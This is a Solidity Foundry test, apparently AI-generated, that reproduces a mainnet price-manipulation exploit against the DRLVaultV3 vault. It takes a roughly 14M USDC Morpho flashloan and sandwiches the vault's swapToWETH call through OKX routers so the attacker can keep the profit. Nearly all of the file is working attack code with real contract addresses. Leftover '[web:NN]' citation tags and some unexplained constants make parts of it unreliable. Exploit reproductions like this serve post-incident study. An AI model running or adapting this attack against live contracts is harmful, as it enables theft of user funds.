// GPT + Perplexity generated code for DRVaultV3 attack
// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.17;

import "forge-std/Test.sol";

// -------------------- CONSTANTS / ADDRESSES --------------------

// Optional dedicated CheatCodes handle (you can also just use `vm` directly)
interface CheatCodes {
    function label(address, string calldata) external;
    function createSelectFork(string calldata, uint256) external returns (uint256);
    function roll(uint256) external;
}

CheatCodes constant cheat =
    CheatCodes(0x7109709ECfa91a80626fF3989D68f67F5b1DD12D);

// Tx: 0xe3eab35b288c086afa9b86a97ab93c7bb61d21b1951a156d2a8f6f5d5715c475
uint256 constant FORK_BLOCK = 23_769_386; // block before attack tx

// Attacker (whitehat) EOA
address constant ATTACKER_EOA  = 0xC0ffeEBABE5D496B2DDE509f9fa189C25cF29671;

// Attacker contract (MEV bot) on mainnet – only for labeling
address constant ATTACKER_CONTRACT = 0xE08D97e151473A848C3d9CA3f323Cb720472D015;

// Vulnerable vault (DRLVaultV3)
address constant DRL_VAULT = 0x6A06707ab339BEE00C6663db17DdB422301ff5e8;

// Morpho Blue vault (flashloan provider)
address constant MORPHO = 0xBBBBBbbBBb9cC5e90e3b3Af64bdAF62C37EEFFCb;

// OKX routers used in the exploit
address constant OKX_DEX_ROUTER   = 0x2E1Dee213BA8d7af0934C49a23187BabEACa8764;
address constant OKX_DEX_ROUTER_5 = 0xF6801D319497789f934ec7F83E142a9536312B08;
address constant TOKEN_APPROVE = 0x40aA958dd87FC8305b97f2BA922CDdCa374bcD7f; // Intermediary for token transfers

// Tokens
address constant USDC = 0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48; // 6 decimals
address constant WETH = 0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2;

address constant USDC_WETH_POOL = 0xE0554a476A092703abdB3Ef35c80e0D76d32939F;

// -------------------- INTERFACES --------------------

interface IERC20 {
    function balanceOf(address) external view returns (uint256);
    function approve(address spender, uint256 amount) external returns (bool);
    function transfer(address to, uint256 value) external returns (bool);
    function transferFrom(address from, address to, uint256 value) external returns (bool);
}

/// @notice Minimal Morpho flashloan interface (per docs & mocks)
/// https://docs.morpho.org/learn/concepts/flashloans/ [web:21]
interface IMorpho {
    function flashLoan(address token, uint256 assets, bytes calldata data) external;
}

/// @notice Callback interface expected by Morpho Blue [web:21][web:24]
interface IMorphoFlashLoanCallback {
    function onMorphoFlashLoan(uint256 assets, bytes calldata data) external;
}

/// @notice Vulnerable vault, only the function used in exploit [web:12]
interface IDRLVaultV3 {
    function swapToWETH(uint256 _amount) external returns (uint256 _amountOut);
}

/// @notice OKX router: uniswapV3SwapTo (selector 0x0d5f0e3b) [web:22]
interface IOKXRouter {
    function uniswapV3SwapTo(
        uint256 receiver,
        uint256 amount,
        uint256 minReturn,
        uint256[] calldata pools
    ) external payable returns (uint256 returnAmount);
}

// -------------------- ATTACKER TEST HARNESS --------------------

contract DRLVaultV3Test is Test {
    Exploit exploit;

    function setUp() public {
        // Fork Ethereum mainnet at the block just before attack tx
        cheat.createSelectFork("mainnet", FORK_BLOCK);
        cheat.roll(FORK_BLOCK);

        // Label key addresses for nicer logs
        cheat.label(ATTACKER_EOA, "ATTACKER_EOA");
        cheat.label(ATTACKER_CONTRACT, "ATTACKER_CONTRACT(MEV Bot)");
        cheat.label(DRL_VAULT, "DRLVaultV3");
        cheat.label(MORPHO, "Morpho");
        cheat.label(OKX_DEX_ROUTER, "OKX_DEX_ROUTER");
        cheat.label(OKX_DEX_ROUTER_5, "OKX_DEX_ROUTER_5");
        cheat.label(USDC, "USDC");
        cheat.label(WETH, "WETH");

        exploit = new Exploit();

        console.log("-------------------------------- Start Exploit ----------------------------------");
    }

    function testExploit() public {
        // Simulate the real attacker EOA as sender and origin
        vm.startPrank(ATTACKER_EOA, ATTACKER_EOA);

        emit log_named_decimal_uint(
            "[Start] Attacker USDC",
            IERC20(USDC).balanceOf(ATTACKER_EOA),
            6
        );

        exploit.runExploit();

        emit log_named_decimal_uint(
            "[End] Attacker USDC",
            IERC20(USDC).balanceOf(ATTACKER_EOA),
            6
        );

        vm.stopPrank();
        console.log("-------------------------------- End Exploit ----------------------------------");
    }
}

// -------------------- ATTACKER LOGIC CONTRACT --------------------

contract Exploit is Test, IMorphoFlashLoanCallback {
    uint256 public flashAmount;

    function runExploit() public {
        // Verichains analysis & traces show ~14M USDC borrowed [web:12]
        flashAmount = 13_980_773e6;

        // Start Morpho flashloan: Morpho will call onMorphoFlashLoan in the same tx [web:21][web:24]
        IMorpho(MORPHO).flashLoan(USDC, flashAmount, hex"01");
    }

    /// @notice Morpho Blue flashloan callback, where the whole sandwich + victim call is executed.
    function onMorphoFlashLoan(uint256 assets, bytes calldata /*data*/) external override {
        require(msg.sender == MORPHO, "not morpho");

        // 1) Approvals
        IERC20(USDC).approve(TOKEN_APPROVE, type(uint256).max);
        IERC20(WETH).approve(TOKEN_APPROVE, type(uint256).max);
        // Approve Morpho to pull back principal at the end of callback [web:21]
        IERC20(USDC).approve(MORPHO, assets);

        IERC20(USDC).approve(USDC_WETH_POOL, type(uint256).max);
        IERC20(WETH).approve(USDC_WETH_POOL, type(uint256).max);

        // 2) Sandwich leg 1: USDC -> WETH via OKX router (pump WETH price)
        //    In the real tx, `poolsIn` holds routing info into the Uniswap V3 USDC/WETH pool. [web:22][web:28]
        uint256[] memory poolsIn = new uint256[](1);
        poolsIn[0] = 14474011154664524427946373127366704448275315930774981940324572871603728323487;

        IOKXRouter(OKX_DEX_ROUTER).uniswapV3SwapTo(
            uint256(uint160(address(this))), // receiver packed in uint256
            assets,
            96069676420420156,                // minReturn
            poolsIn
        );

        // 3) Victim action: vault buys WETH at manipulated price using on-chain quote [web:12]
        //    Verichains & other analyses: vault swaps ~100,000 USDC. [web:12]
        IDRLVaultV3(DRL_VAULT).swapToWETH(100_000e6);

        // 4) Sandwich leg 2: WETH -> USDC unwind via second OKX router
        uint256 wethBal = IERC20(WETH).balanceOf(address(this));

        uint256[] memory poolsOut = new uint256[](1);
        poolsOut[0] = 57896044618658097711785492505624669893251560180390193455121166874571151938463;

        IOKXRouter(OKX_DEX_ROUTER_5).uniswapV3SwapTo(
            uint256(uint160(address(this))),
            wethBal,
            0,
            poolsOut
        );

        // 5) After this function returns, Morpho pulls `assets` USDC from this contract
        //    using the approval above; any leftover USDC is profit for the attacker. [web:21]
    }

    function uniswapV3SwapCallback(int256 amount0Delta, int256 amount1Delta, bytes calldata data) external {
        IERC20(WETH).transfer(USDC_WETH_POOL, uint256(amount1Delta));
    }

    receive() external payable {}
    fallback() external payable {}
}
